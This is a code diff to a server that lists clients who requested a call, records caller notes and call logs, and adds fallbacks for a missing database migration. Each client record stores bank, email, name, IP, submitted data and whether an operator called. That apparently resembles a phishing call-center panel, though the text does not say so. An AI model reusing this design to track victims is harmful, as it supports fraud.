@@ -504,6 +504,7 @@ async function handleCallerLogin(req, reply) {
 async function handleCallerClients(req, reply) {
   if (!requireCaller(req, reply)) return;
   try {
+    // Full select including new fields (requires prisma db push on server)
     const clients = await prisma.webClient.findMany({
       where: { callRequested: true },
       orderBy: { updatedAt: 'desc' },
@@ -517,8 +518,25 @@ async function handleCallerClients(req, reply) {
     });
     return reply.send({ clients });
   } catch (err) {
-    console.error('[caller-clients] error:', err?.message || err);
-    return reply.status(500).send({ error: 'server_error' });
+    console.error('[caller-clients] primary query error, trying fallback:', err?.message || err);
+    // Fallback: DB not yet migrated (callerNote column missing) — omit new field
+    try {
+      const clients = await prisma.webClient.findMany({
+        where: { callRequested: true },
+        orderBy: { updatedAt: 'desc' },
+        select: {
+          id: true, flowSessionId: true, email: true, bank: true,
+          nombre: true, ip: true, status: true,
+          operatorCalled: true, calledAt: true, createdAt: true,
+          submissionData: true,
+          events: { orderBy: { createdAt: 'asc' }, select: { event: true, createdAt: true } },
+        },
+      });
+      return reply.send({ clients });
+    } catch (err2) {
+      console.error('[caller-clients] fallback error:', err2?.message || err2);
+      return reply.status(500).send({ error: 'server_error' });
+    }
   }
 }
 
@@ -553,6 +571,10 @@ async function handleCallerNote(req, reply) {
     return reply.send({ ok: true });
   } catch (err) {
     console.error('[caller-note] error:', err?.message || err);
+    // callerNote column may not exist yet — tell client to run db migration
+    if (err?.message?.includes('callerNote') || err?.code === 'P2022') {
+      return reply.status(503).send({ error: 'db_migration_needed', hint: 'Run: prisma db push' });
+    }
     return reply.status(500).send({ error: 'server_error' });
   }
 }
@@ -560,25 +582,36 @@ async function handleCallerNote(req, reply) {
 async function handleGetCallLogs(req, reply) {
   if (!requireCaller(req, reply)) return;
   try {
-    const logs = await prisma.callLog.findMany({
-      orderBy: { createdAt: 'desc' },
-      take: 300,
-      include: {
-        client: {
-          select: { id: true, flowSessionId: true, nombre: true, email: true, bank: true, ip: true, status: true },
+    const [logs, clients] = await Promise.all([
+      prisma.callLog.findMany({
+        orderBy: { createdAt: 'desc' },
+        take: 300,
+        include: {
+          client: {
+            select: { id: true, flowSessionId: true, nombre: true, email: true, bank: true, ip: true, status: true },
+          },
         },
-      },
-    });
-    // Also return clients that have callRequested for the "add log" form
-    const clients = await prisma.webClient.findMany({
-      where: { callRequested: true },
-      orderBy: { updatedAt: 'desc' },
-      select: { id: true, nombre: true, email: true, bank: true },
-    });
+      }),
+      prisma.webClient.findMany({
+        where: { callRequested: true },
+        orderBy: { updatedAt: 'desc' },
+        select: { id: true, nombre: true, email: true, bank: true },
+      }),
+    ]);
     return reply.send({ logs, clients });
   } catch (err) {
     console.error('[call-logs] error:', err?.message || err);
-    return reply.status(500).send({ error: 'server_error' });
+    // CallLog table may not exist yet — return empty gracefully
+    try {
+      const clients = await prisma.webClient.findMany({
+        where: { callRequested: true },
+        orderBy: { updatedAt: 'desc' },
+        select: { id: true, nombre: true, email: true, bank: true },
+      });
+      return reply.send({ logs: [], clients, _warning: 'db_migration_needed' });
+    } catch (err2) {
+      return reply.status(500).send({ error: 'server_error' });
+    }
   }
 }
 
